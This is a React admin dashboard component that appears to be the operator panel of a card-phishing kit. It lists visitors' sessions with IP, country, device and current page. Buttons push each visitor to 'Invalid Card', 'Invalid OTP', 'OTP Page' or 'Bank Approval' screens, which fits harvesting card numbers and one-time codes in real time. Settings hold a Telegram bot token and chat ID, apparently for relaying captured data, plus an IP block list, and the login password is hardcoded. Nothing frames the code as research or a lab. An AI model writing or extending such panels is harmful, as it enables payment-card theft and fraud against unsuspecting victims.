'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
import { Trash2, LogOut, Lock, Unlock, Ban, CreditCard, Lock as LockIcon, Smartphone, CheckCircle, Globe, Monitor, Chrome, Copy, Settings, X } from 'lucide-react';

interface UserSession {
  id: string;
  currentPage: string;
  lastActive: number;
  userState: 'invalid_card' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';
  ip?: string;
  country?: string;
  device?: string;
  browser?: string;
  createdAt?: number;
  isActive?: boolean;
  lastSeen?: number;
}

type ControlAction = 'invalid_card' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';

const ADMIN_AUTH_KEY = 'admin_auth_token';

export function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [sessions, setSessions] = useState<UserSession[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [showSettings, setShowSettings] = useState(false);
  const [telegramBotToken, setTelegramBotToken] = useState('');
  const [telegramChatId, setTelegramChatId] = useState('');
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [newBlockedIp, setNewBlockedIp] = useState('');

  const CORRECT_PASSWORD = 'weareme';

  // Check for existing auth token on mount
  useEffect(() => {
    const token = localStorage.getItem(ADMIN_AUTH_KEY);
    if (token) {
      // Verify token is still valid
      verifyToken(token);
    }
  }, []);

  const verifyToken = async (token: string) => {
    try {
      const response = await fetch('/api/admin/auth', {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        setIsAuthenticated(true);
        fetchSessions();
        fetchConfig();
        // Set up auto-refresh
        const interval = setInterval(fetchSessions, 3000);
        return () => clearInterval(interval);
      } else {
        localStorage.removeItem(ADMIN_AUTH_KEY);
      }
    } catch (error) {
      console.error('Token verification failed:', error);
      localStorage.removeItem(ADMIN_AUTH_KEY);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/admin/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });

      if (response.ok) {
        const data = await response.json();
        localStorage.setItem(ADMIN_AUTH_KEY, data.token);
        setIsAuthenticated(true);
        setPassword('');
        fetchSessions();
        fetchConfig();
        // Set up auto-refresh
        const interval = setInterval(fetchSessions, 3000);
        return () => clearInterval(interval);
      } else {
        alert('Incorrect password');
        setPassword('');
      }
    } catch (error) {
      console.error('Login failed:', error);
      alert('Login failed');
    }
  };

  const fetchSessions = async () => {
    try {
      const response = await fetch('/api/admin/sessions');
      if (response.ok) {
        const data = await response.json();
        setSessions(data);
      }
    } catch (error) {
      console.error('Failed to fetch sessions:', error);
    }
  };

  const fetchConfig = async () => {
    try {
      const response = await fetch('/api/admin/config');
      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps || []);
      }
    } catch (error) {
      console.error('Failed to fetch config:', error);
    }
  };

  const handleUpdateTelegramConfig = async () => {
    if (!telegramBotToken || !telegramChatId) {
      alert('Please fill in both fields');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch('/api/admin/config', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          telegramBotToken,
          telegramChatId,
        }),
      });

      if (response.ok) {
        alert('Telegram configuration updated successfully!');
        setShowSettings(false);
      } else {
        alert('Failed to update configuration');
      }
    } catch (error) {
      console.error('Failed to update config:', error);
      alert('Failed to update configuration');
    } finally {
      setLoading(false);
    }
  };

  const handleBlockIp = async () => {
    if (!newBlockedIp) {
      alert('Please enter an IP address');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'block',
          ip: newBlockedIp,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        setNewBlockedIp('');
        alert(`IP ${newBlockedIp} has been blocked`);
      }
    } catch (error) {
      console.error('Failed to block IP:', error);
      alert('Failed to block IP');
    } finally {
      setLoading(false);
    }
  };

  const handleUnblockIp = async (ip: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'unblock',
          ip,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        alert(`IP ${ip} has been unblocked`);
      }
    } catch (error) {
      console.error('Failed to unblock IP:', error);
      alert('Failed to unblock IP');
    } finally {
      setLoading(false);
    }
  };

  const handleControlAction = async (sessionId: string, action: ControlAction, ip?: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          action,
          ip,
        }),
      });

      if (response.ok) {
        const actionLabels: Record<ControlAction, string> = {
          'invalid_card': 'Invalid Card',
          'invalid_otp': 'Invalid OTP',
          '3d-secure-otp': 'OTP Page',
          '3d-secure-app': 'Bank Approval',
          'block': 'Block',
          'normal': 'Normal',
        };
        alert(`${actionLabels[action]} command sent successfully`);
        fetchSessions();
      }
    } catch (error) {
      console.error('Failed to send control command:', error);
      alert('Failed to send control command');
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteSession = async (sessionId: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/sessions', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId }),
      });

      if (response.ok) {
        alert('Session deleted successfully');
        fetchSessions();
      }
    } catch (error) {
      console.error('Failed to delete session:', error);
      alert('Failed to delete session');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem(ADMIN_AUTH_KEY);
    setIsAuthenticated(false);
    setSessions([]);
    setPassword('');
    setShowSettings(false);
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const formatTime = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleTimeString();
  };

  const getStateColor = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return 'bg-orange-900/30 text-orange-300';
      case 'invalid_otp':
        return 'bg-red-900/30 text-red-300';
      case '3d-secure-otp':
        return 'bg-blue-900/30 text-blue-300';
      case '3d-secure-app':
        return 'bg-purple-900/30 text-purple-300';
      case 'block':
        return 'bg-red-900/30 text-red-300';
      default:
        return 'bg-green-900/30 text-green-300';
    }
  };

  const getStateIcon = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return <CreditCard className="w-3 h-3" />;
      case 'invalid_otp':
        return <LockIcon className="w-3 h-3" />;
      case '3d-secure-otp':
        return <Smartphone className="w-3 h-3" />;
      case '3d-secure-app':
        return <CheckCircle className="w-3 h-3" />;
      case 'block':
        return <Ban className="w-3 h-3" />;
      default:
        return <CheckCircle className="w-3 h-3" />;
    }
  };

  const getStateLabel = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return 'Invalid Card';
      case 'invalid_otp':
        return 'Invalid OTP';
      case '3d-secure-otp':
        return 'OTP Page';
      case '3d-secure-app':
        return 'Bank Approval';
      case 'block':
        return 'Blocked';
      default:
        return 'Active';
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Lock className="w-5 h-5" />
              Admin Dashboard
            </CardTitle>
            <CardDescription className="text-slate-400">
              Enter your password to access the admin panel
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <Input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
              />
              <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700">
                Login
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white flex items-center gap-2">
              <Unlock className="w-8 h-8" />
              Admin Dashboard
            </h1>
            <p className="text-slate-400 mt-1">Monitor and control active user sessions</p>
          </div>
          <div className="flex gap-2">
            <Button onClick={() => setShowSettings(!showSettings)} variant="outline" className="flex items-center gap-2">
              <Settings className="w-4 h-4" />
              Settings
            </Button>
            <Button onClick={handleLogout} variant="destructive" className="flex items-center gap-2">
              <LogOut className="w-4 h-4" />
              Logout
            </Button>
          </div>
        </div>

        {/* Settings Panel */}
        {showSettings && (
          <Card className="bg-slate-800 border-slate-700 mb-8">
            <CardHeader>
              <CardTitle className="text-white flex items-center justify-between">
                <span>Settings</span>
                <button onClick={() => setShowSettings(false)}>
                  <X className="w-5 h-5" />
                </button>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Telegram Configuration */}
              <div className="space-y-4">
                <h3 className="text-white font-semibold">Telegram Configuration</h3>
                <div>
                  <label className="text-slate-300 text-sm">Bot Token</label>
                  <Input
                    type="password"
                    placeholder="Enter Telegram Bot Token"
                    value={telegramBotToken}
                    onChange={(e) => setTelegramBotToken(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500 mt-1"
                  />
                </div>
                <div>
                  <label className="text-slate-300 text-sm">Chat ID</label>
                  <Input
                    type="text"
                    placeholder="Enter Telegram Chat ID"
                    value={telegramChatId}
                    onChange={(e) => setTelegramChatId(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500 mt-1"
                  />
                </div>
                <Button onClick={handleUpdateTelegramConfig} disabled={loading} className="bg-green-600 hover:bg-green-700">
                  {loading ? 'Updating...' : 'Update Telegram Config'}
                </Button>
              </div>

              {/* IP Blocking */}
              <div className="space-y-4 border-t border-slate-700 pt-6">
                <h3 className="text-white font-semibold">IP Blocking</h3>
                <div className="flex gap-2">
                  <Input
                    type="text"
                    placeholder="Enter IP address to block"
                    value={newBlockedIp}
                    onChange={(e) => setNewBlockedIp(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
                  />
                  <Button onClick={handleBlockIp} disabled={loading} className="bg-red-600 hover:bg-red-700">
                    Block IP
                  </Button>
                </div>

                {blockedIps.length > 0 && (
                  <div className="space-y-2">
                    <h4 className="text-slate-300 text-sm font-semibold">Blocked IPs:</h4>
                    <div className="space-y-2">
                      {blockedIps.map((ip) => (
                        <div key={ip} className="flex items-center justify-between bg-slate-700 p-2 rounded">
                          <span className="text-slate-200 font-mono">{ip}</span>
                          <Button
                            size="sm"
                            onClick={() => handleUnblockIp(ip)}
                            disabled={loading}
                            className="bg-green-600 hover:bg-green-700 text-xs"
                          >
                            Unblock
                          </Button>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-slate-400">Active Sessions</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-white">{sessions.length}</div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-slate-400">Invalid Cards</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-orange-400">
                {sessions.filter(s => s.userState === 'invalid_card').length}
              </div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-slate-400">Invalid OTPs</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-red-400">
                {sessions.filter(s => s.userState === 'invalid_otp').length}
              </div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-slate-400">Blocked Users</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold text-red-500">
                {sessions.filter(s => s.userState === 'block').length}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Sessions Table */}
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white">Active User Sessions</CardTitle>
            <CardDescription className="text-slate-400">
              View and manage all active user sessions in real-time
            </CardDescription>
          </CardHeader>
          <CardContent>
            {sessions.length === 0 ? (
              <div className="text-center py-8 text-slate-400">
                No active sessions
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-slate-700">
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Session ID</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">IP Address</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Country</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Device</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Browser</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Current Page</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Status</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Last Active</th>
                      <th className="text-left py-3 px-4 text-slate-300 font-semibold">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {sessions.map((session) => (
                      <tr key={session.id} className={`border-b border-slate-700 ${session.isActive === false ? 'bg-red-900/20 opacity-60' : 'hover:bg-slate-700/50'}`}>
                        <td className="py-3 px-4 text-slate-200 font-mono text-xs">
                          <div className="flex items-center gap-2">
                            <span>{session.id.substring(0, 8)}...</span>
                            <button
                              onClick={() => copyToClipboard(session.id, session.id)}
                              className="p-1 hover:bg-slate-600 rounded"
                              title="Copy full ID"
                            >
                              <Copy className="w-3 h-3 text-slate-400" />
                            </button>
                            {copiedId === session.id && <span className="text-xs text-green-400">Copied!</span>}
                          </div>
                        </td>
                        <td className="py-3 px-4 text-slate-300 font-mono text-xs">
                          {session.ip || 'Unknown'}
                        </td>
                        <td className="py-3 px-4 text-slate-300">
                          <div className="flex items-center gap-1">
                            <Globe className="w-3 h-3" />
                            {session.country || 'Unknown'}
                          </div>
                        </td>
                        <td className="py-3 px-4 text-slate-300">
                          <div className="flex items-center gap-1">
                            <Monitor className="w-3 h-3" />
                            {session.device || 'Unknown'}
                          </div>
                        </td>
                        <td className="py-3 px-4 text-slate-300">
                          <div className="flex items-center gap-1">
                            <Chrome className="w-3 h-3" />
                            {session.browser || 'Unknown'}
                          </div>
                        </td>
                        <td className="py-3 px-4 text-slate-300 text-xs">{session.currentPage}</td>
                        <td className="py-3 px-4">
                          <div className="flex flex-col gap-1">
                            <span className={`inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium ${getStateColor(session.userState)}`}>
                              {getStateIcon(session.userState)}
                              {getStateLabel(session.userState)}
                            </span>
                            {session.isActive === false && (
                              <span className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium bg-red-900/50 text-red-300">
                                Inactive
                              </span>
                            )}
                          </div>
                        </td>
                        <td className="py-3 px-4 text-slate-400 text-xs">
                          {formatTime(session.lastActive)}
                        </td>
                        <td className="py-3 px-4">
                          <div className="flex gap-1 flex-wrap">
                            <Button
                              size="sm"
                              variant="outline"
                              className="text-xs border-orange-600 text-orange-300 hover:bg-orange-900/30"
                              onClick={() => handleControlAction(session.id, 'invalid_card')}
                              disabled={loading || session.isActive === false}
                            >
                              <CreditCard className="w-3 h-3 mr-1" />
                              Invalid Card
                            </Button>

                            <Button
                              size="sm"
                              variant="outline"
                              className="text-xs border-red-600 text-red-300 hover:bg-red-900/30"
                              onClick={() => handleControlAction(session.id, 'invalid_otp')}
                              disabled={loading || session.isActive === false}
                            >
                              <LockIcon className="w-3 h-3 mr-1" />
                              Invalid OTP
                            </Button>

                            <Button
                              size="sm"
                              variant="outline"
                              className="text-xs border-blue-600 text-blue-300 hover:bg-blue-900/30"
                              onClick={() => handleControlAction(session.id, '3d-secure-otp')}
                              disabled={loading || session.isActive === false}
                            >
                              <Smartphone className="w-3 h-3 mr-1" />
                              OTP
                            </Button>

                            <Button
                              size="sm"
                              variant="outline"
                              className="text-xs border-purple-600 text-purple-300 hover:bg-purple-900/30"
                              onClick={() => handleControlAction(session.id, '3d-secure-app')}
                              disabled={loading || session.isActive === false}
                            >
                              <CheckCircle className="w-3 h-3 mr-1" />
                              Bank Approval
                            </Button>

                            <AlertDialog>
                              <AlertDialogTrigger asChild>
                                <Button
                                  size="sm"
                                  variant="destructive"
                                  className="text-xs"
                                >
                                  <Ban className="w-3 h-3 mr-1" />
                                  Block
                                </Button>
                              </AlertDialogTrigger>
                              <AlertDialogContent className="bg-slate-800 border-slate-700">
                                <AlertDialogTitle className="text-white">Block User</AlertDialogTitle>
                                <AlertDialogDescription className="text-slate-400">
                                  Are you sure you want to block this user? They will be redirected to a blocked page and their IP will be blocked.
                                </AlertDialogDescription>
                                <div className="flex gap-2 justify-end">
                                  <AlertDialogCancel className="bg-slate-700 text-white border-slate-600 hover:bg-slate-600">
                                    Cancel
                                  </AlertDialogCancel>
                                  <AlertDialogAction
                                    onClick={() => handleControlAction(session.id, 'block', session.ip)}
                                    disabled={loading}
                                    className="bg-red-600 hover:bg-red-700"
                                  >
                                    {loading ? 'Blocking...' : 'Block User'}
                                  </AlertDialogAction>
                                </div>
                              </AlertDialogContent>
                            </AlertDialog>

                            <AlertDialog>
                              <AlertDialogTrigger asChild>
                                <Button
                                  size="sm"
                                  variant="ghost"
                                  className="text-xs text-slate-400 hover:text-red-400 hover:bg-slate-700"
                                >
                                  <Trash2 className="w-3 h-3" />
                                </Button>
                              </AlertDialogTrigger>
                              <AlertDialogContent className="bg-slate-800 border-slate-700">
                                <AlertDialogTitle className="text-white">Delete Session</AlertDialogTitle>
                                <AlertDialogDescription className="text-slate-400">
                                  Are you sure you want to delete this session? The user will be logged out.
                                </AlertDialogDescription>
                                <div className="flex gap-2 justify-end">
                                  <AlertDialogCancel className="bg-slate-700 text-white border-slate-600 hover:bg-slate-600">
                                    Cancel
                                  </AlertDialogCancel>
                                  <AlertDialogAction
                                    onClick={() => handleDeleteSession(session.id)}
                                    disabled={loading}
                                    className="bg-red-600 hover:bg-red-700"
                                  >
                                    {loading ? 'Deleting...' : 'Delete'}
                                  </AlertDialogAction>
                                </div>
                              </AlertDialogContent>
                            </AlertDialog>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
